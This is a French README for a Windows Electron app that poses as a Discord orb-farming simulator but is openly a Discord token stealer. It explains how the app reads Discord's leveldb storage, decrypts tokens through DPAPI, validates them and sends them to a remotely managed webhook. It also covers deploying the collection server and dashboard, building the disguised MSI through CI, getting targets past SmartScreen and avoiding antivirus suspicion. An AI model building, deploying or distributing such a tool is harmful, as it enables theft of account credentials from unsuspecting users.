# OrbRush

Trois briques :

1. **L'app Windows** (Electron) : capture le token Discord local, design anime, simulation de farm d'orbs.
2. **Le serveur** (Node/Express, deployable sur Render) : distribue l'URL du webhook et affiche les captures.
3. **La CI GitHub Actions** : construit l'installeur toute seule, sans Node installe sur ton PC.

La personne qui lance l'app n'a **rien** a configurer. Le webhook est pilote a distance depuis le dashboard.

---

## 0. Pour les cibles : installer l'app

Aucun outil a installer, aucune compilation.

1. Ouvre l'onglet **Releases** du depot.
2. Telecharge `OrbRush-X.Y.Z-setup.msi`.
3. Double-clique, installe, lance. C'est fini.

---

## 1. Deployer le serveur sur Render

### Option A - Blueprint (recommande)

1. Pousse ce depot sur GitHub.
2. Render -> New -> Blueprint -> selectionne le depot.
3. Render lit `render.yaml` et cree le service.
4. Renseigne les variables demandees :
   - `ADMIN_KEY` : ta cle secrete pour le dashboard (longue chaine aleatoire).
   - `DEFAULT_WEBHOOK` : ton URL de webhook Discord (peut rester vide, tu la mettras via le dashboard).

### Option B - Manuel

    Type    : Web Service
    Runtime : Node
    Build   : npm install
    Start   : node server/index.js
    Env     : ADMIN_KEY, DEFAULT_WEBHOOK

### Persistance

Le plan gratuit Render a un disque ephemere : `server/data/` est vide a chaque redeploiement.

- soit tu gardes `DEFAULT_WEBHOOK` defini dans les variables d'environnement,
- soit tu ajoutes un disque persistant (plan payant) monte sur le dossier `server/data`
  et tu definis `DATA_DIR` sur ce chemin.

---

## 2. Configurer le webhook

Ouvre l'URL Render, saisis la cle admin, colle l'URL du webhook Discord, clique sur **Enregistrer**,
puis sur **Tester** pour verifier.

Recuperer une URL de webhook : salon Discord -> Parametres du salon -> Integrations -> Webhooks.

---

## 3. Brancher l'app sur ton serveur

Dans `electron/remote.js`, remplace :

    const DEFAULT_SERVER = 'https://orbrush.onrender.com';

par l'URL de ton service Render. C'est la seule ligne a changer.

Optionnel : `FALLBACK_WEBHOOK` permet de coder en dur un webhook de secours si le serveur dort.

---

## 4. Publier l'installeur sans rien installer sur son PC

Le workflow `.github/workflows/build.yml` s'en occupe.

### Methode 1 - Bouton (la plus simple)

1. Onglet **Actions** -> **Build Windows MSI** -> **Run workflow**.
2. Saisis la version (`1.2.0`) et laisse `publish` sur `oui`.
3. Au bout de quelques minutes, l'installeur apparait dans **Releases**.

### Methode 2 - Tag Git

    git tag v1.2.0
    git push origin v1.2.0

La release est creee automatiquement avec l'installeur attache.

### Methode 3 - Push sur main

Chaque push sur `main` construit l'installeur et le depose dans les **artefacts** du run
(onglet Actions -> run -> section Artifacts). Pratique pour tester.

### Ce que fait le workflow

- Tourne sur `windows-latest` (Electron + WiX disponibles nativement).
- Genere l'icone applicative via `scripts/make-icon.js`.
- `npm install`, puis `npm run dist:ci`.
- Repli automatique sur NSIS (`.exe`) si la cible MSI echoue.
- Upload l'artefact et cree la release GitHub avec les notes generees.

---

## Icone de l'application

L'icone n'est pas un binaire commite : elle est **generee** par `scripts/make-icon.js`,
en pur Node, sans aucune dependance.

    npm run assets

Produit `build/icon.png` (256x256) et `build/icon.ico` (16 a 256).
Les hooks `predist`, `predist:ci`, `predist:exe` la regenerent automatiquement avant chaque build.

C'est indispensable : sans icone, la cible MSI d'electron-builder echoue en
`LGHT0094 : The identifier 'OrbRushIcon.exe' could not be found`, car le template WiX
reference une icone qui n'a jamais ete emise.

---

## 5. Developpement local (optionnel)

    npm install
    npm start          # lance l'app
    npm run server     # lance le serveur en local sur le port 3000
    npm run dist       # construit le .msi sur ta machine

---

## Antivirus / SmartScreen

- Electron + installeur MSI (WiX) : aucun script exotique, rien de suspect pour Windows Defender.
- L'installeur n'etant pas signe, SmartScreen peut afficher un avertissement :
  Informations complementaires -> Executer quand meme.
- Aucune dependance native : pas de compilation C++ au build.

---

## Fonctionnement de la capture

1. Lecture des dossiers `Local Storage/leveldb` de Discord, Discord PTB, Canary et Development.
2. Recherche du token en clair, sinon dechiffrement DPAPI via PowerShell (scope utilisateur courant).
3. Validation du token aupres de l'API Discord pour identifier le compte.
4. Resolution du webhook : serveur distant -> webhook local -> cache -> defaut.
5. Envoi d'un embed complet, puis journalisation de la capture sur le serveur.

---

## API du serveur

| Methode | Route | Auth | Description |
| --- | --- | --- | --- |
| GET | /api/health | non | Etat du service |
| GET | /api/config | non | Webhook courant (lu par l'app) |
| POST | /api/capture | non | Journalise une capture |
| GET | /api/captures | oui | Liste les captures |
| DELETE | /api/captures | oui | Vide l'historique |
| POST | /api/config | oui | Definit le webhook |
| POST | /api/test | oui | Envoie un message de test |
| GET | /api/check | oui | Verifie la cle admin |

L'auth se fait via l'en-tete `x-admin-key`.

---

## Structure

    .github/workflows/build.yml   CI : build et publication de l'installeur
    scripts/ci-prepare.js         resolution de version pour la CI
    scripts/make-icon.js          generation de l'icone (PNG + ICO, zero dependance)
    electron/main.js              processus principal, fenetre, IPC, resolution du webhook
    electron/preload.js           pont securise renderer <-> main
    electron/remote.js            appel au serveur Render (config + log)
    electron/grabber.js           detection et dechiffrement du token
    electron/webhook.js           construction et envoi du payload Discord
    src/index.html                interface
    src/styles.css                design et animations
    src/renderer.js               logique de l'interface
    server/index.js               API Express
    server/store.js               persistance JSON
    server/public/                dashboard admin
    render.yaml                   blueprint Render

---

## Prerequis

- Cote cible : Windows 10/11 x64, rien d'autre.
- Cote toi : un compte GitHub, un compte Render.
- Node 18+ seulement si tu veux lancer en local (sinon la CI s'en charge).
